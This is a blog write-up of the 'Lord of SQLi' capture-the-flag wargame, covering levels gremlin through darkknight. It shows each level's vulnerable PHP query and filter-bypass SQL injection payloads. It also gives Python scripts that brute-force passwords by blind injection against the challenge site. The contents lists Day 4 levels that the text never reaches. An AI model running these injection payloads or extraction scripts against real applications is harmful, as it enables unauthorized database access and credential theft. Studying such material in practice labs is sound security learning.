<!DOCTYPE html>
<html lang="en" data-mode="light">
  <head prefix="og: http://ogp.me/ns#">
    <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="generator" content="Hugo 0.92.2">
<meta name="theme" content="Color Your World -- gitlab.com/rmaguiar/hugo-theme-color-your-world">
























<title>Lord of Sqli | d@rkmod3</title>






<meta name="robots" content="index follow">




  
    <link rel="canonical" href="/posts/lord_of_sqli/">
  








<meta property="og:site_name" content="d@rkmod3">
<meta property="og:title" content="Lord of Sqli">

  <meta property="og:url" content="/posts/lord_of_sqli/">







  


  <meta property="og:type" content="article">
  
  
    <meta property="article:published_time" content="2021-03-15">
    <meta property="article:modified_time" content="2021-03-15">
    <meta property="og:updated_time" content="2021-03-15">
  

  
  
  
  


















<meta name="theme-color" content="#222">

<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="default">









  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Article",
      "mainEntityOfPage": {
        "@type": "WebSite",
        "@id": ""
      },
      "headline": "Lord of Sqli",
      "description": "",
      
      "url": "\/posts\/lord_of_sqli\/",
      "inLanguage": "en",
      "datePublished": "2021-03-15",
      "dateModified": "2021-03-15",
      "wordCount" : "1283",
      "publisher": {
        "@type": "Person",
        "name": ""
      },
      "author": {
        "@type": "Person",
        "name": "",
        
        
      }
    }
  </script>






<link rel="stylesheet" href="/css/main.min.78522036ddf9f6185ddda21a1e9757b2153d186edb58d42839dfafe93bd833a5.css" integrity="sha256-eFIgNt359hhd3aIaHpdXshU9GG7bWNQoOd&#43;v6TvYM6U=" crossorigin="anonymous">



<noscript>

  
  

  
    <meta name="theme-color" content="#1dbc91" media="(prefers-color-scheme: dark)">
    <meta name="theme-color" content="#1f676b" media="(prefers-color-scheme: light)">
  

  
  <link rel="stylesheet" href="/css/noscript.min.9bacd85b6f1d42296c56d3b8457d0c13a4e7f415c4ca5fc8affb6ed6b39cad72.css" integrity="sha256-m6zYW28dQilsVtO4RX0ME6Tn9BXEyl/Ir/tu1rOcrXI=" crossorigin="anonymous">

</noscript>



<link rel="preload" href="/fonts/open-sans-v17-latin-700.woff2" as="font" crossorigin="anonymous">
<link rel="preload" href="/fonts/open-sans-v17-latin-italic.woff2" as="font" crossorigin="anonymous">
<link rel="preload" href="/fonts/open-sans-v17-latin-regular.woff2" as="font" crossorigin="anonymous">
<link rel="preload" href="/fonts/oswald-v29-latin-700.woff2" as="font" crossorigin="anonymous">













  
  


<script src="/js/main.e4ee12b434ffdd596ecf1fbccc43808313345020d5bfbf9a7ff3d761d07da22b.js" integrity="sha256-5O4StDT/3Vluzx&#43;8zEOAgxM0UCDVv7&#43;af/PXYdB9ois=" crossorigin="anonymous"></script>

  </head>

  <body>

    <header>
      

  <a href="/">d@rkmod3</a>





    </header>

    <div class="filler">
      

  <main>
    <article>
      <header>
        
        <h1>Lord of Sqli</h1>

        
          <p>
            
              Published on <time datetime="2021-03-15">2021-03-15</time>
            
          </p>
        
        
        
        
      </header>
 
          <details class="toc" open>
    <summary class="outline-dashed">
      Contents
    </summary>
    
    <nav id="TableOfContents">
  <ul>
    <li><a href="#day-1">Day 1</a>
      <ul>
        <li><a href="#grimlin">Grimlin</a></li>
        <li><a href="#cobolt">Cobolt</a></li>
        <li><a href="#goblin">Goblin</a></li>
        <li><a href="#orc">orc</a></li>
      </ul>
    </li>
    <li><a href="#day-2">Day 2</a>
      <ul>
        <li><a href="#wolfman">wolfman</a></li>
        <li><a href="#darkelf">darkelf</a></li>
        <li><a href="#orge">orge</a></li>
        <li><a href="#troll">troll</a></li>
      </ul>
    </li>
    <li><a href="#day-3">Day 3</a>
      <ul>
        <li><a href="#vampire">vampire</a></li>
        <li><a href="#skeleton">skeleton</a></li>
        <li><a href="#golem">golem</a></li>
        <li><a href="#darkknight">darkknight</a></li>
      </ul>
    </li>
    <li><a href="#day-4">Day 4</a>
      <ul>
        <li><a href="#buggear">buggear</a></li>
        <li><a href="#giant">giant</a></li>
        <li><a href="#assassin">assassin</a></li>
        <li><a href="#succubus">Succubus</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </details>
        













































<hr>









  <h2 id="day-1"><a class="anchor" href="#day-1" title='Anchor for: Day 1.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> Day 1</h2> 

<ul>
<li>Grimlin</li>
<li>cobolt</li>
<li>goblin</li>
<li>orc</li>
</ul>









  <h3 id="grimlin"><a class="anchor" href="#grimlin" title='Anchor for: Grimlin.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> Grimlin</h3> 

<p>To win this game, we force <code>$result['id']</code> return any value.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"> $query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select id from prob_gremlin where id=&#39;</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">id</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; and pw=&#39;</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">pw</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>;
</code></pre></div><p>I use <code>'</code> to escape id param and add a sql command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;or(1)--+-</span>
    <span style="color:#75715e"># ... where id=&#39;&#39; or(1)-- +-and pw=</span>
    id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; union select &#39;</span>vietcaijvaodaycungduoc<span style="color:#e6db74">&#39; --+-</span>
    <span style="color:#75715e"># try with union, huh!</span>
    <span style="color:#75715e"># ... many ways</span>
</code></pre></div>








  <h3 id="cobolt"><a class="anchor" href="#cobolt" title='Anchor for: Cobolt.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> Cobolt</h3> 

<p>Same with <code>Grimlin</code> we must do some trick to force <code>$result['id'] = 'admin'</code></p>
<p>Focus the php code below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select id from prob_cobolt where id=&#39;</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">id</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; and pw=md5(&#39;</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">pw</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;)&#34;</span>; 
<span style="color:#66d9ef">if</span>($result[<span style="color:#e6db74">&#39;id&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;admin&#39;</span>) <span style="color:#a6e22e">solve</span>(<span style="color:#e6db74">&#34;cobolt&#34;</span>);
</code></pre></div><p>Clearly <code>union select</code> is a good choice to control value return from id, so the payload look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">    id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> <span style="color:#e6db74">&#39;admin&#39;</span> <span style="color:#75715e">-- and pw=md5(&#39;&#39;) Here id will return &#34;admin&#34; because &#34;pw&#34; is commented
</span></code></pre></div>








  <h3 id="goblin"><a class="anchor" href="#goblin" title='Anchor for: Goblin.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> Goblin</h3> 

<p>Focus the php code below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select id from prob_goblin where id=&#39;guest&#39; and no=</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">no</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; 
$result <span style="color:#f92672">=</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">mysqli_fetch_array</span>(<span style="color:#a6e22e">mysqli_query</span>($db,$query)); 
<span style="color:#66d9ef">if</span>($result[<span style="color:#e6db74">&#39;id&#39;</span>]) <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;h2&gt;Hello </span><span style="color:#e6db74">{</span>$result[<span style="color:#a6e22e">id</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/h2&gt;&#34;</span>; 
<span style="color:#66d9ef">if</span>($result[<span style="color:#e6db74">&#39;id&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;admin&#39;</span>) <span style="color:#a6e22e">solve</span>(<span style="color:#e6db74">&#34;goblin&#34;</span>);
</code></pre></div><p>Here the mission is force id return &lsquo;admin&rsquo;, notice the code added <code>@mysqli_fetch_array</code> which return array of values.</p>
<p>Continue view the code, it filter some little bit painful sql operator.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/prob|_|\.|\(\)/i&#39;</span>, $_GET[<span style="color:#a6e22e">no</span>])) <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#34;No Hack ~_~&#34;</span>); 
  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/\&#39;|\&#34;|\`/i&#39;</span>, $_GET[<span style="color:#a6e22e">no</span>])) <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#34;No Quotes ~_~&#34;</span>); 
</code></pre></div><p>Nah, i&rsquo;m good. It doesn&rsquo;t make it hard for me, here i have 2 idea to solve this challenge.</p>
<ul>
<li>solution 1 : Use char() to make &lsquo;admin&rsquo; string</li>
<li>solution 2 : Add one condition to find <code>no</code> value of <code>admin</code></li>
<li>solution 3 : Bruteforce to find <code>no</code> value of <code>admin</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#75715e">-- solution 1
</span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#66d9ef">no</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> char(<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>)

<span style="color:#75715e">-- solution 2
</span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#66d9ef">no</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">no</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>
<span style="color:#75715e">-- When we use payload above, the condition of &#39;where&#39; command is 
</span><span style="color:#75715e"></span><span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;guest&#39;</span> <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">no</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">no</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>
<span style="color:#75715e">-- Equivelent to `where false or no&gt; 1`
</span><span style="color:#75715e">-- solution 3 
</span><span style="color:#75715e">-- Use burp intruder to brute force `no` from 1-100, i found value `no` of admin is 2
</span><span style="color:#75715e">-- so this payload look like: 
</span><span style="color:#75715e"></span><span style="color:#f92672">?</span><span style="color:#66d9ef">no</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">no</span><span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>
</code></pre></div>








  <h3 id="orc"><a class="anchor" href="#orc" title='Anchor for: orc.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> orc</h3> 

<p>The level is increasing, but i&rsquo;ll never give up xD))</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
  <span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;./config.php&#34;</span>; 
  <span style="color:#a6e22e">login_chk</span>(); 
  $db <span style="color:#f92672">=</span> <span style="color:#a6e22e">dbconnect</span>(); 
  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/prob|_|\.|\(\)/i&#39;</span>, $_GET[<span style="color:#a6e22e">pw</span>])) <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#34;No Hack ~_~&#34;</span>); 
  $query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select id from prob_orc where id=&#39;admin&#39; and pw=&#39;</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">pw</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>; 
  <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;hr&gt;query : &lt;strong&gt;</span><span style="color:#e6db74">{</span>$query<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&#34;</span>; 
  $result <span style="color:#f92672">=</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">mysqli_fetch_array</span>(<span style="color:#a6e22e">mysqli_query</span>($db,$query)); 
  <span style="color:#66d9ef">if</span>($result[<span style="color:#e6db74">&#39;id&#39;</span>]) <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;h2&gt;Hello admin&lt;/h2&gt;&#34;</span>; 
   
  $_GET[<span style="color:#a6e22e">pw</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">addslashes</span>($_GET[<span style="color:#a6e22e">pw</span>]); 
  $query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select pw from prob_orc where id=&#39;admin&#39; and pw=&#39;</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">pw</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>; 
  $result <span style="color:#f92672">=</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">mysqli_fetch_array</span>(<span style="color:#a6e22e">mysqli_query</span>($db,$query)); 
  <span style="color:#66d9ef">if</span>(($result[<span style="color:#e6db74">&#39;pw&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> ($result[<span style="color:#e6db74">&#39;pw&#39;</span>] <span style="color:#f92672">==</span> $_GET[<span style="color:#e6db74">&#39;pw&#39;</span>])) <span style="color:#a6e22e">solve</span>(<span style="color:#e6db74">&#34;orc&#34;</span>); 
  <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>); 
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>The challenge have 2 part</p>
<ul>
<li>part 1: force sql command to return any value</li>
<li>part 2: brute force to get exactly password</li>
</ul>
<p>Part 1:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">    <span style="color:#f92672">?</span>pw<span style="color:#f92672">=</span><span style="color:#e6db74">&#39; union select &#39;</span>a<span style="color:#e6db74">&#39;
</span></code></pre></div><p>OK we done part 1, but wait the function addslashes is used.
It means that we can&rsquo;t use quote.
In oder to <code>$result['pw'] == $_GET['pw']</code> we only one way is brute force password.
Notice that, if we inject a true condition, it will return string &lsquo;Hello admin&rsquo;.
Nice, exploit &hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
<span style="color:#f92672">import</span> string

url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php&#34;</span>
<span style="color:#75715e"># ?pw=&#39; or length(pw) &gt; 8 or &#39; -- I extract length of pw is 8</span>
pw <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
session <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;abc...&#39;</span>
cookie <span style="color:#f92672">=</span> { <span style="color:#e6db74">&#39;PHPSESSID&#39;</span> : <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>session<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>}

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">9</span>):
    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>digits <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>ascii_lowercase:
        payload <span style="color:#f92672">=</span> {
            <span style="color:#e6db74">&#34;pw&#34;</span> : <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#39; or substr(pw,</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">,1)=&#39;</span><span style="color:#e6db74">{</span>c<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
        }
        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url, params<span style="color:#f92672">=</span>payload, cookies<span style="color:#f92672">=</span>cookie)
        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;Hello admin&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
            pw <span style="color:#f92672">+=</span> c
            print(pw)
            <span style="color:#66d9ef">break</span>
<span style="color:#75715e">#pw=095a9852</span>
</code></pre></div><hr>









  <h2 id="day-2"><a class="anchor" href="#day-2" title='Anchor for: Day 2.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> Day 2</h2> 

<ul>
<li>wolfman</li>
<li>darkelf</li>
<li>orge</li>
<li>troll</li>
</ul>









  <h3 id="wolfman"><a class="anchor" href="#wolfman" title='Anchor for: wolfman.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> wolfman</h3> 

<p>It is a beautiful day, I continue to try challenge.
Review the code, I see it filter space. My mission is bypass it, and force the id return <code>admin</code>.
Learn from previous challenge, <code>union</code> is command helpful.
With <code>space</code> we can replace by comment syntax <code>/**/</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">    <span style="color:#66d9ef">select</span> id <span style="color:#66d9ef">from</span> prob_wolfman <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;guest&#39;</span> <span style="color:#66d9ef">and</span> pw<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#66d9ef">union</span><span style="color:#75715e">/**/</span><span style="color:#66d9ef">select</span><span style="color:#75715e">/**/</span><span style="color:#e6db74">&#39;admin&#39;</span>
</code></pre></div>








  <h3 id="darkelf"><a class="anchor" href="#darkelf" title='Anchor for: darkelf.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> darkelf</h3> 

<p>Nothing special filter, continue use <code>wolfman</code> payload</p>









  <h3 id="orge"><a class="anchor" href="#orge" title='Anchor for: orge.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> orge</h3> 

<p>It same to <a href="#orc">orc</a> challenge, author add filters <code>or</code>,<code>and</code>.
we just need replace <code>or</code> with <code>||</code> and <code>and</code> with <code>&amp;&amp;</code></p>









  <h3 id="troll"><a class="anchor" href="#troll" title='Anchor for: troll.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> troll</h3> 

<p>Easy challenge :)), notice that pattern of <code>preg_match</code> is not have flag <code>i</code> (case insensitive).
It means we can use &lsquo;Admin&rsquo; instead of &lsquo;admin&rsquo;</p>
<pre aria-label="Box containing code sample." tabindex=0><code>?id=Admin
</code></pre><hr>









  <h2 id="day-3"><a class="anchor" href="#day-3" title='Anchor for: Day 3.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> Day 3</h2> 

<ul>
<li>vampire</li>
<li>skeleton</li>
<li>golem</li>
<li>darkknight</li>
</ul>









  <h3 id="vampire"><a class="anchor" href="#vampire" title='Anchor for: vampire.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> vampire</h3> 

<p>I wake up at 6 o&rsquo;clock and feel so full of energy, have breakfast and play CTF :)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,$_GET[<span style="color:#a6e22e">id</span>]);
</code></pre></div><p>This chall replace &lsquo;admin&rsquo; string, it not hard to bypass it.
Because <code>str_replace</code> function is not recursive, so you can write <code>adadminmin</code>, and when it replace <code>admin</code> it becomes to <code>ad</code>admin<code>min</code>.</p>
<p>So the payload will be:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span>adadminmin
</code></pre></div>








  <h3 id="skeleton"><a class="anchor" href="#skeleton" title='Anchor for: skeleton.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> skeleton</h3> 

<p>Use <a href="#cobolt">Cobolt</a> payload</p>









  <h3 id="golem"><a class="anchor" href="#golem" title='Anchor for: golem.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> golem</h3> 

<p>Use <a href="#orc">orc</a> idea, but replace <code>or</code> by <code>||</code>; <code>and</code> by <code>&amp;&amp;</code>.
Author add filter <code>substr</code> and <code>=</code> so i think a couple of hours, i found <code>like</code> is useful to replace <code>=</code>.</p>
<p>Nice, but how use it?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">select</span> id <span style="color:#66d9ef">from</span> prob_golem <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;guest&#39;</span> <span style="color:#66d9ef">and</span> pw<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">||</span> id <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;admin&#39;</span> <span style="color:#f92672">&amp;&amp;</span> pw <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;%&#39;</span>
<span style="color:#75715e">-- return hello admin
</span><span style="color:#75715e"></span><span style="color:#66d9ef">select</span> id <span style="color:#66d9ef">from</span> prob_golem <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;guest&#39;</span> <span style="color:#66d9ef">and</span> pw<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">||</span> id <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;admin&#39;</span> <span style="color:#f92672">&amp;&amp;</span> pw <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;7%&#39;</span>
<span style="color:#75715e">-- return hello admin
</span><span style="color:#75715e"></span><span style="color:#66d9ef">select</span> id <span style="color:#66d9ef">from</span> prob_golem <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;guest&#39;</span> <span style="color:#66d9ef">and</span> pw<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">||</span> id <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;admin&#39;</span> <span style="color:#f92672">&amp;&amp;</span> pw <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;7a%&#39;</span>
<span style="color:#75715e">-- return not anything
</span></code></pre></div><p>My code to solve this challenge:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
<span style="color:#f92672">import</span> string

url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php&#34;</span>
<span style="color:#75715e"># ?pw=&#39; || (id like (&#39;admin&#39;) &amp;&amp; length(pw) &gt; 8) || &#39; -- I extract length of pw is 8</span>
pw <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
session <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;qckem3eou6njaopue0repj1g4l&#39;</span>
cookie <span style="color:#f92672">=</span> { <span style="color:#e6db74">&#39;PHPSESSID&#39;</span> : <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>session<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>}
req <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">9</span>):
    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>digits <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>ascii_lowercase:
        payload <span style="color:#f92672">=</span> {
            <span style="color:#e6db74">&#34;pw&#34;</span> : <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#39; || id like &#39;admin&#39; &amp;&amp; pw like &#39;</span><span style="color:#e6db74">{</span>pw<span style="color:#f92672">+</span>c<span style="color:#e6db74">}</span><span style="color:#e6db74">%&#34;</span>
        }
        r <span style="color:#f92672">=</span> req<span style="color:#f92672">.</span>get(url, params<span style="color:#f92672">=</span>payload, cookies<span style="color:#f92672">=</span>cookie)
        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;Hello admin&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
            pw <span style="color:#f92672">+=</span> c
            print(pw)
            <span style="color:#66d9ef">break</span>
</code></pre></div>








  <h3 id="darkknight"><a class="anchor" href="#darkknight" title='Anchor for: darkknight.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> darkknight</h3> 

<p>Use <a href="#golem">golem</a> idea.
i replace <code>''</code> by <code>char()</code> , <code>substring()</code> by <code>left()</code>.</p>
<p>Many ways, huh!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#f92672">?</span><span style="color:#66d9ef">no</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span>(id <span style="color:#66d9ef">like</span> char(<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">left</span>(pw,<span style="color:#ae81ff">8</span>) <span style="color:#66d9ef">like</span> char(<span style="color:#ae81ff">48</span>,<span style="color:#ae81ff">98</span>,<span style="color:#ae81ff">55</span>,<span style="color:#ae81ff">48</span>,<span style="color:#ae81ff">101</span>,<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">49</span>,<span style="color:#ae81ff">102</span>))
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">   <span style="color:#f92672">=&gt;</span> pw <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>b70ea1f
</code></pre></div><hr>









